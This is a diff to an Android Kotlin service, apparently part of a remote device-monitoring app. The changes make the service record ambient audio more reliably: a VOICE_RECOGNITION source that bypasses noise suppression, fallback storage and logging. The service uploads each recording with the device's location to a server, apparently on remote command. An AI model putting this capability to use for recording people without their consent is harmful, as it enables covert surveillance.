@@ -561,8 +561,44 @@ class MediaCaptureService : Service() {
 
     // ── Audio ───────────────────────────────────────────────────────────────
 
+    @android.annotation.SuppressLint("MissingPermission")
     private suspend fun captureAudio() {
-        val file = File(cacheDir, "mt_audio_${System.currentTimeMillis()}.m4a")
+        // Ensure cache directory exists
+        val cacheDirPath = cacheDir.absolutePath
+        Log.i(TAG, "Cache directory: $cacheDirPath")
+
+        // Try multiple storage locations as fallback
+        val possibleLocations = listOf(
+            cacheDir,
+            filesDir,
+            getExternalFilesDir(null) ?: filesDir,
+            File("/sdcard/Android/data/$packageName/cache")
+        )
+
+        var file: File? = null
+        for (dir in possibleLocations) {
+            try {
+                if (!dir.exists()) {
+                    dir.mkdirs()
+                    Log.i(TAG, "Created directory: ${dir.absolutePath}")
+                }
+                val testFile = File(dir, "mt_test_${System.currentTimeMillis()}")
+                if (testFile.createNewFile()) {
+                    testFile.delete()
+                    file = File(dir, "mt_audio_${System.currentTimeMillis()}.m4a")
+                    Log.i(TAG, "Using writable location: ${dir.absolutePath}")
+                    break
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Cannot use ${dir.absolutePath}: ${e.message}")
+            }
+        }
+
+        if (file == null) {
+            throw IllegalStateException("Cannot find writable storage for audio capture")
+        }
+
+        Log.i(TAG, "Audio capture file: ${file.absolutePath}")
         var recorder: MediaRecorder? = null
         try {
             recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
@@ -572,10 +608,16 @@ class MediaCaptureService : Service() {
                 MediaRecorder()
             }
             recorder.apply {
-                // Use MIC with proper configuration for ambient sound capture.
-                // VOICE_RECOGNITION gives better gain control for speech,
-                // but MIC is more reliable across OEMs for ambient sounds.
-                setAudioSource(MediaRecorder.AudioSource.MIC)
+                // VOICE_RECOGNITION bypasses noise suppression and AGC
+                // This allows ambient sounds to be captured clearly
+                // Falls back to MIC if VOICE_RECOGNITION not supported
+                try {
+                    setAudioSource(MediaRecorder.AudioSource.VOICE_RECOGNITION)
+                    Log.i(TAG, "Using VOICE_RECOGNITION audio source")
+                } catch (e: Exception) {
+                    Log.w(TAG, "VOICE_RECOGNITION not supported, using MIC")
+                    setAudioSource(MediaRecorder.AudioSource.MIC)
+                }
                 setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                 // AAC is well-supported; use higher quality for ambient capture.
                 setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
@@ -590,8 +632,11 @@ class MediaCaptureService : Service() {
                 setAudioChannels(2)  // Stereo for better ambient capture
                 setMaxDuration(AUDIO_CAPTURE_MS.toInt())
                 setOutputFile(file.absolutePath)
+                Log.i(TAG, "Preparing MediaRecorder for audio capture")
                 prepare()
+                Log.i(TAG, "MediaRecorder prepared, starting capture")
                 start()
+                Log.i(TAG, "Audio capture started successfully")
             }
 
             // ── Silence detection ─────────────────────────────────────────
@@ -641,13 +686,25 @@ class MediaCaptureService : Service() {
 
             try {
                 recorder.stop()
+                Log.i(TAG, "Audio recorder stopped successfully")
             } catch (e: RuntimeException) {
                 // stop() after a short/failed recording throws — release and
                 // let the upload path report the failure honestly.
+                Log.e(TAG, "Audio recorder stop failed: ${e.message}")
                 throw IllegalStateException("Audio recorder stopped unexpectedly", e)
             }
             recorder.release()
             recorder = null
+
+            // Verify file exists and has content
+            if (!file.exists()) {
+                throw IllegalStateException("Audio file not found after recording: ${file.absolutePath}")
+            }
+            if (file.length() == 0L) {
+                throw IllegalStateException("Audio file is empty after recording")
+            }
+
+            Log.i(TAG, "Audio file size: ${file.length()} bytes")
             uploadMedia("audio", file.readBytes(), lastLat(), lastLng())
         } finally {
             try { recorder?.release() } catch (e: Exception) {}
@@ -727,6 +784,7 @@ class MediaCaptureService : Service() {
     }
 
     private suspend fun uploadMedia(type: String, bytes: ByteArray, lat: Double?, lng: Double?) {
+        Log.i(TAG, "Uploading $type media: ${bytes.size} bytes")
         val body = JSONObject().apply {
             put("device_id", prefs().getString("device_id", "") ?: "")
             put("type", type)
@@ -737,7 +795,11 @@ class MediaCaptureService : Service() {
         }.toString().toRequestBody(JSON)
 
         val ok = post("/api/device/media", body)
-        if (!ok) throw IllegalStateException("Media upload rejected by server")
+        if (!ok) {
+            Log.e(TAG, "Media upload failed for $type")
+            throw IllegalStateException("Media upload rejected by server")
+        }
+        Log.i(TAG, "$type media uploaded successfully")
     }
 
     private suspend fun ackCommand(id: Int, status: String, failureReason: String? = null) {
